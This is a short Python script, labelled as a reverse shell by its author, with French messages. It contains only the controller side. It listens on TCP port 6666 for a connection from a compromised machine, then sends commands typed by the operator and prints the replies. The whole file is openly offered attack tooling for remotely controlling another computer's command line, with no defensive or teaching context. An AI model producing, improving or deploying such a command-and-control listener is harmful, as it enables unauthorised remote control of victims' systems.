#!/usr/bin/python3

# A python Reverse-shell
# Developed by Elieroc
# Start of project : 25/11/2020
# Actual version : 1.0

import socket
import sys

host, port = ('', 6666)

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.bind((host, port))
print('Le serveur est démarré !'+"\n")

while True:
    socket.listen()
    conn, address = socket.accept()
    print("/!\ Client connecté /!\ ")
    while True:
        print("Envoyer une commande :")
        data=str( sys.stdin.readline() )
        data = data.encode("utf8")
        conn.send(data)

        data = conn.recv(9999)
        data = str( data.decode("utf-8", errors="ignore"))
        print("Message reçu :\n"+data)

conn.close()
socket.close()
